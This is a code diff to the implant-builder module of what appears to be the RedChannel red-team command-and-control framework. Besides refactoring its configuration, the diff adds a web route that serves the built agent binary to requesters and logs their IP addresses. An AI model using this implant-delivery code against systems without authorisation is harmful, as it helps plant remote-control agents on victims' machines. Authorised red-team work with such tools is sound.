@@ -7,6 +7,7 @@ import Logger from "../lib/logger";
 import { Constants, emsg } from "../utils/utils";
 import BaseModule, { ExecuteCallbackFunction, ExecuteCallbackResult, ExecuteReturn } from "./base";
 import RedChannel from "../lib/redchannel";
+import { Request, Response } from "express";
 
 const MODULE_DESCRIPTION = "build implants for operations";
 
@@ -15,7 +16,7 @@ const AGENT_CONFIG_PATH = `${AGENT_PATH}/config/config.go`;
 const AGENT_BUILD_SCRIPT = `${AGENT_PATH}/tools/build.py`;
 const AGENT_BUILD_LOG_PATH = `${AGENT_PATH}/build/build.log`;
 
-export type ImplantConfig = {
+export type ImplantModuleConfig = {
     os: string;
     arch: string;
     resolver: string;
@@ -24,7 +25,7 @@ export type ImplantConfig = {
 };
 
 export default class ImplantModule extends BaseModule {
-    config: ImplantConfig;
+    config: ImplantModuleConfig;
     outputFile: string;
     log: Logger;
 
@@ -32,21 +33,20 @@ export default class ImplantModule extends BaseModule {
      * @param redChannelConfig The redchannel config object, used to grab config data while building the agent config
      * @param redChannel The red channel modules object, used to grab data from other modules while building the agent config
      */
-    constructor(protected configFile, protected redChannel: RedChannel) {
-        super("implant", configFile);
+    constructor(protected redChannel: RedChannel, mergeConfig: Partial<ImplantModuleConfig>) {
+        super("implant", redChannel.configFile, mergeConfig);
 
         this.description = MODULE_DESCRIPTION;
 
         this.log = new Logger();
 
-        this.config = {
+        this.config = this.resetConfig({
             os: "windows",
             arch: "amd64",
             interval: 5000,
             resolver: "8.8.8.8:53",
             debug: false,
-        };
-        this.config = this.getConfigFromFile();
+        });
 
         this.outputFile = "";
 
@@ -188,6 +188,21 @@ export default class ImplantModule extends BaseModule {
         }
 
         return { message: logData };
+    }
+
+    setupRoutes(webServer: any, logger: Logger): void {
+        webServer.get(this.redChannel.modules.c2.config.binary_route, (request: Request, response: Response) => {
+            const ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
+            logger.warn(`incoming request for agent binary from ${ip}`);
+            try {
+                if (!fs.existsSync(this.outputFile)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
+                response.sendFile(this.outputFile);
+                logger.warn(`agent binary sent to ${ip}`);
+            } catch (ex) {
+                logger.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
+                response.status(404).send("404 File Not Found");
+            }
+        });
     }
 
     private generateConfig() {
